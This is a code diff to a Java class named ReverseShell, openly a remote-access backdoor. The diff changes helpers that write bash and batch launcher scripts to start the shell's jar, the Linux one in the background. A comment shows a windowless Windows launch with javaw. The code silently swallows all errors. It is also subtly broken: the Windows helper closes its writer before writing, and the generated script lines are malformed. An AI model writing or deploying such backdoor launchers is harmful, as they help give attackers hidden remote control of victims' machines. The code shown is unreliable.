@@ -5,6 +5,19 @@ import java.net.Socket;
 @SuppressWarnings("all")
 class ReverseShell {
 
+
+    public static void linuxSH(){
+        String pathFile = "scripts/script.sh",
+                scriptContent = "#!/bin/bash \n \"java -jar jar/ReverseShell.jar &\" > " + pathFile;
+        try{
+            Writer output = new BufferedWriter(new FileWriter(pathFile));
+            output.write(scriptContent);
+            output.close();
+            Runtime.getRuntime().exec("chmod +x " + pathFile);
+        }catch (IOException ignored){}
+    }
+
+
     /**
      * @echo off
      * set port=9999
@@ -13,20 +26,12 @@ class ReverseShell {
      * start javaw -Xmx2g -jar src/Utils/ReverseShell.jar
      */
 
-    public static void linuxSH(){
-        String scriptContent = "#!/bin/bash \n \"java -jar src/Utils/ReverseShell.jar &\" > out/production/utils.sh";
-        try{
-            Writer output = new BufferedWriter(new FileWriter("out/production/utils.sh"));
-            output.write(scriptContent);
-            output.close();
-            Runtime.getRuntime().exec("chmod u+x out/production/utils.sh");
-        }catch (IOException ignored){}
-    }
-
     public static void windowsBat(){
-        String scriptContent = "@echo off \n echo \"start java -Xmx2g -jar src/Utils/ReverseShell.jar\" > out/production/utils.bat";
+        String pathFile = "scripts/script.bat",
+                scriptContent = "@echo off \n echo \"start java -jar jar/ReverseShell.jar\" > " + pathFile;
         try{
-            Writer output = new BufferedWriter(new FileWriter("out/production/utils.bat"));
+            Writer output = new BufferedWriter(new FileWriter(pathFile));
+            output.close();
             output.write(scriptContent);
         }catch (IOException ignored){}
     }
